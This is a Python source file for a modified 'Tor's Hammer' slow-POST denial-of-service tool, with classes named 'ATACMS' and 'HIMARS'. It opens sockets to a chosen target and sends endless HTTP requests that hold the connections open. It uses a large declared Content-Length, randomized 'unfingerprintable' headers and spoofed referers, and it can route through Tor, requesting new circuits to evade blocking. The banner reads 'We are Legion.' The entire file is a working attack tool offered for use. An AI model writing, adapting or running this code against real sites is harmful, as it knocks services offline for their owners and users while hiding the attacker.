#!/usr/bin/python
# -*- coding: utf-8 -*-

import multiprocessing
import sys

from multiprocessing import Process
import socks
import socket
import ssl
import argparse
import string
import random
import logging
from time import sleep
from colors import Colors


LOGLEVEL    = logging.DEBUG


# Constants
USER_AGENT_PARTS = {
    'os': {
        'linux': {
            'name': [ 'Linux x86_64', 'Linux i386' ],
            'ext': [ 'X11' ]
        },
        'windows': {
            'name': [ 'Windows NT 6.1', 'Windows NT 6.3', 'Windows NT 5.1', 'Windows NT.6.2' ],
            'ext': [ 'WOW64', 'Win64; x64' ]
        },
        'mac': {
            'name': [ 'Macintosh' ],
            'ext': [ 'Intel Mac OS X %d_%d_%d' % (random.randint(10, 11), random.randint(0, 9), random.randint(0, 5)) for i in range(1, 10) ]
        },
    },
    'platform': {
        'webkit': {
            'name': [ 'AppleWebKit/%d.%d' % (random.randint(535, 537), random.randint(1,36)) for i in range(1, 30) ],
            'details': [ 'KHTML, like Gecko' ],
            'extensions': [ 'Chrome/%d.0.%d.%d Safari/%d.%d' % (random.randint(6, 32), random.randint(100, 2000), random.randint(0, 100), random.randint(535, 537), random.randint(1, 36)) for i in range(1, 30) ] + [ 'Version/%d.%d.%d Safari/%d.%d' % (random.randint(4, 6), random.randint(0, 1), random.randint(0, 9), random.randint(535, 537), random.randint(1, 36)) for i in range(1, 10) ]
        },
        'iexplorer': {
            'browser_info': {
                'name': [ 'MSIE 6.0', 'MSIE 6.1', 'MSIE 7.0', 'MSIE 7.0b', 'MSIE 8.0', 'MSIE 9.0', 'MSIE 10.0' ],
                'ext_pre': [ 'compatible', 'Windows; U' ],
                'ext_post': [ 'Trident/%d.0' % i for i in range(4, 6) ] + [ '.NET CLR %d.%d.%d' % (random.randint(1, 3), random.randint(0, 5), random.randint(1000, 30000)) for i in range(1, 10) ]
            }
        },
        'gecko': {
            'name': [ 'Gecko/%d%02d%02d Firefox/%d.0' % (random.randint(2001, 2010), random.randint(1,31), random.randint(1,12) , random.randint(10, 25)) for i in range(1, 30) ],
            'details': [],
            'extensions': []
        }
    }
}


class ATACMS(object):


    def __init__(self, host, port, method, use_ssl=None, tor_ip=None, tor_port=None, tor_password=None):

        self.host = host
        self.port = port
        self.method = method
        if use_ssl is None: self.use_ssl = False
        else: self.use_ssl = use_ssl

        self.tor_ip = tor_ip
        self.tor_port = tor_port
        self.tor_password = tor_password
        self.use_tor = True if tor_ip is not None and tor_port is not None else False

        self.connected = False
        self.socket = None
        self.ssl = None

        self.referers = [ 
            'http://www.google.com/',
            'http://www.bing.com/',
            'http://www.baidu.com/',
            'http://www.yandex.com/',
            'http://www.yahoo.com/',
            'http://www.globo.com/',
            'http://www.pastebin.com/',
            'https://www.nasa.gov/',
            'https://www.facebook.com/',
            'http://www.chris.com/',
            'http://www.retrojunkie.com/',
            'http://www.usatoday.com/',
            'http://www.engadget.search.aol.com/',
            'http://www.ask.com/',
            'http://www.sogou.com/',
            'http://www.zhongsou.com/',
            'http://www.dmoz.org/',
            'http://' + self.host + '/'
            'https://' + self.host + '/'
            ]


    def _connect(self, ) -> bool:

        self._disconnect()

        try:
            self.socket = socks.socksocket()
            if self.use_tor:
                self.socket.setproxy(socks.PROXY_TYPE_SOCKS5, self.tor_ip, self.tor_port)

            self.socket.connect((self.host, self.port))

            if self.use_ssl:
                self.ssl = ssl.wrap_socket(self.socket)

            self.connected = True

        except OSError as e:
            self.connected = False
            logging.debug(f'{e}')
            # raise e

        return self.connected


    def _disconnect(self, ):
        
        if self.ssl is not None:
            self.ssl.shutdown()
            self.ssl.close()
            self.ssl = None

        if self.socket is not None:
            self.socket.shutdown(socket.SHUT_RDWR)
            self.socket.close()
            self.socket = None

        self.connected = False


    def _build_block(self, size) -> string:
        
        msg = ''
        for _ in range(size):
            msg += random.choice(string.ascii_letters + string.digits)

        return msg


    def _generate_query_string(self, ammount = 1) -> str:

        queryString = []

        for i in range(ammount):

            key = self._build_block(random.randint(3,10))
            value = self._build_block(random.randint(3,20))
            element = "{0}={1}".format(key, value)
            queryString.append(element)

        return '&'.join(queryString)


    def _generate_data(self) -> "tuple[str, str]":

        param_joiner = "?"
        url = self.host

        if len(url) == 0: url = '/'
        if url.count("?") > 0: param_joiner = "&"

        request_url = self._generate_request_url(param_joiner)
        http_headers = self._generate_random_headers()

        return (request_url, http_headers)

    
    def _generate_request_url(self, param_joiner = '?'):
        return self.host + param_joiner + self._generate_query_string(random.randint(1,5))


    def _generate_user_agent(self):

        ## Mozilla Version
        mozilla_version = "Mozilla/5.0" # hardcoded for now, almost every browser is on this version except IE6

        ## System And Browser Information
        # Choose random OS
        os = USER_AGENT_PARTS['os'][random.choice(list(USER_AGENT_PARTS['os'].keys()))]
        os_name = random.choice(os['name']) 
        sysinfo = os_name

        # Choose random platform
        platform = USER_AGENT_PARTS['platform'][random.choice(list(USER_AGENT_PARTS['platform'].keys()))]

        # Get Browser Information if available
        if 'browser_info' in platform and platform['browser_info']:
            browser = platform['browser_info']

            browser_string = random.choice(browser['name'])

            if 'ext_pre' in browser:
                browser_string = "%s; %s" % (random.choice(list(browser['ext_pre'])), browser_string)

            sysinfo = "%s; %s" % (browser_string, sysinfo)

            if 'ext_post' in browser:
                sysinfo = "%s; %s" % (sysinfo, random.choice(list(browser['ext_post'])))


        if 'ext' in os and os['ext']:
            sysinfo = "%s; %s" % (sysinfo, random.choice(list(os['ext'])))

        ua_string = "%s (%s)" % (mozilla_version, sysinfo)

        if 'name' in platform and platform['name']:
            ua_string = "%s %s" % (ua_string, random.choice(list(platform['name'])))

        if 'details' in platform and platform['details']:
            ua_string = "%s (%s)" % (ua_string, random.choice(list(platform['details'])) if len(platform['details']) > 1 else platform['details'][0] )

        if 'extensions' in platform and platform['extensions']:
            ua_string = "%s %s" % (ua_string, random.choice(list(platform['extensions'])))

        return ua_string


    def _generate_random_headers(self):

        # Random no-cache entries
        noCacheDirectives = ['no-cache', 'max-age=0']
        random.shuffle(noCacheDirectives)
        nrNoCache = random.randint(1, (len(noCacheDirectives)-1))
        noCache = ', '.join(noCacheDirectives[:nrNoCache])

        # Random accept encoding
        acceptEncoding = ['\'\'','*','identity','gzip','deflate']
        random.shuffle(acceptEncoding)
        nrEncodings = random.randint(1,int(len(acceptEncoding)/2))
        roundEncodings = acceptEncoding[:nrEncodings]

        http_headers = {
            'User-Agent': self._generate_user_agent(),
            'Cache-Control': noCache,
            'Accept-Encoding': ', '.join(roundEncodings),
            'Connection': 'keep-alive', #timeout=5, max=1000
            'Keep-Alive': f'timeout={random.randint(700,1000)}, max={random.randint(700,1000)}',
            'Host': self.host,
        }
    
        # Randomly-added headers
        # These headers are optional and are 
        # randomly sent thus making the
        # header count random and unfingerprintable
        if random.randrange(2) == 0:
            # Random accept-charset
            acceptCharset = [ 'ISO-8859-1', 'utf-8', 'Windows-1251', 'ISO-8859-2', 'ISO-8859-15', ]
            random.shuffle(acceptCharset)
            http_headers['Accept-Charset'] = '{0},{1};q={2},*;q={3}'.format(acceptCharset[0], acceptCharset[1],round(random.random(), 1), round(random.random(), 1))

        if random.randrange(2) == 0:
            # Random Referer
            url_part = self._build_block(random.randint(5,10))

            random_referer = random.choice(self.referers) + url_part
            
            if random.randrange(2) == 0:
                random_referer = random_referer + '?' + self._generate_query_string(random.randint(1, 10))

            http_headers['Referer'] = random_referer

        # Content Length
        http_headers['Content-Length'] = random.randint(10000, 15000)

        # Random Content-Trype
        http_headers['Content-Type'] = random.choice(['multipart/form-data', 'application/x-url-encoded'])

        if random.randrange(2) == 0:
            # Random Cookie
            http_headers['Cookie'] = self._generate_query_string(random.randint(1, 5))

        return http_headers


    def _create_payload(self) -> "tuple[str, str]":

        req_url, headers = self._generate_data()

        random_keys = list(headers.keys())
        random.shuffle(random_keys)
        random_headers = {}
        
        for header_name in random_keys:
            random_headers[header_name] = headers[header_name]

        return (req_url, random_headers)


    def _prepare_msg(self, ) -> str:

        req_url, headers = self._create_payload()
        method = self.method if self.method != 'rand' else random.choice(['post', 'get'])

        # start line
        start_line = f'{method} {req_url} HTTP/1.1\r\n'

        # header
        header = ''
        for key in headers:
            header += f'{key}: {headers[key]}\r\n'

        # blank line
        header += '\r\n'

        # message
        msg = random.choice(string.ascii_letters + string.digits)

        return start_line + header + msg


    def send(self, ) -> bool:
        
        if not self.connected:
            self._connect()

        try:

            if self.connected:
                if self.use_tor:
                    if random.randint(0, 1000) == 27:
                        if self.use_ssl:
                            self.ssl.sendall(f'AUTHENTICATE "{self.tor_password}"\r\nSIGNAL NEWNYM\r\n')
                        else:
                            self.socket.sendall(f'AUTHENTICATE "{self.tor_password}"\r\nSIGNAL NEWNYM\r\n')

                msg = self._prepare_msg()
            
                if self.use_ssl:
                    self.ssl.sendall(msg.encode('utf-8'))
                else:
                    self.socket.sendall(msg.encode('utf-8'))

                return True

        except OSError as e:
            self._disconnect()
            self.connected = False
            logging.debug(f'{e}')

        return False


class HIMARS(Process):


    def __init__(self, args: argparse.Namespace):

        super(HIMARS, self).__init__()
        self.args = args
        self.atacms: ATACMS = []

        self._prepare_atacms()

        
    def _prepare_atacms(self, ):
        for _ in range(self.args.sockets):
            a = ATACMS(self.args.target, self.args.port, self.args.ssl, self.args.tor_ip, self.args.tor_port, self.args.tor_password)
            self.atacms.append(a)


    def run(self,):

        while(1):
            for a in self.atacms:
                if a.send():
                    logging.debug(f"Sent successfuly.")
                else:
                    logging.error(f"Host unreachable.")
                    sleep(random.uniform(0.1, 1))


def main(argv):
   
    parser = argparse.ArgumentParser(description='This script is a modified torshammer script with few additional functionalities taken from blackhorizon.')
    parser.add_argument('-t', '--target', help='IP or URL address of the target.', type=ascii, required=True)
    parser.add_argument('-p', '--port', help='Target\'s port., default=80', type=int, default=80)
    parser.add_argument('-s', '--sockets', help='Number of sockets per process, default=1.', default=1, type=int)
    parser.add_argument('-m', '--method', help='Method to be used, default=POST.', choices=['POST', 'GET', 'RAND'], default='POST')

    sub_parsers = parser.add_subparsers(help='TOR options')
    tor_parser = sub_parsers.add_parser('tor', help='Use tor.')
    tor_parser.add_argument('-r', '--tor-ip', help='TOR ip address and port, default=127.0.0.1', default='127.0.0.1', type=ascii)
    tor_parser.add_argument('-o', '--tor-port', help='TOR\'s port, default=9050', default=9050, type=int)
    tor_parser.add_argument('-w', '--tor-password', help='TOR service pasword', required=True, type=ascii)
    
    args = parser.parse_args(argv)
    args.target = args.target.replace('\'','')
    args.ssl = args.target.startswith('https') == True
    args.target = args.target.replace('https://', '')
    args.target = args.target.replace('http://', '')

    try:
        args.target = socket.gethostbyname(args.target)
    except:
        logging.error('Target IP or URL is in wrong format.')
        sys.exit()


    args.method = args.method.lower()
    args.use_tor = False

    if hasattr(args, 'tor_password'):
        args.use_tor = True
        args.tor_ip  = args.tor_ip.replace('\'','')
        args.tor_password = args.tor_password.replace('\'','')
    else:
        args.tor_ip = None
        args.tor_port = None
        args.tor_password = None

    if args.use_tor:
        Colors.info(f"Target: {args.target}:{args.port}  SSL: {args.ssl}  TOR: {args.tor_ip}:{args.tor_port}")
    else:
        Colors.info(f"Target: {args.target}:{args.port}  SSL: {args.ssl}")
    Colors.info(f"Processes: {multiprocessing.cpu_count()}  Sockets per process: {args.sockets}  Method: {args.method}")
    Colors.warn("Give 20 seconds without tor or 40 seconds before checking the site.")
    _ = input('Press any key to start.')

    procs = []
    for i in range(1): #multiprocessing.cpu_count()):
        p = HIMARS(args)
        procs.append(p)
        p.start()

    logging.debug('Processess launched.')

    try:
        procs = [p.join() for p in procs if p is not None and p.is_alive()]
        sleep(0.1)
  
    except:
        logging.info(f"Shutting down processes. Please wait until done.")

        for p in procs:
            if p is not None:
                p.terminate()

        logging.info(f"Done.")
        sys.exit(0)


if __name__ == "__main__":

    logging.basicConfig(
        level=LOGLEVEL,
        format='%(asctime)s - %(name)s - \033[38;5;209m%(levelname)s\033[0m - %(message)s',
    #   filename='output.txt'
    )
    
    Colors.info("Modified Tor's Hammer ")
    Colors.info("Slow POST DoS Testing Tool")
    Colors.info("Anon-ymized via Tor")
    Colors.info("We are Legion.")
    Colors.info("") 

    main(sys.argv[1:])
    
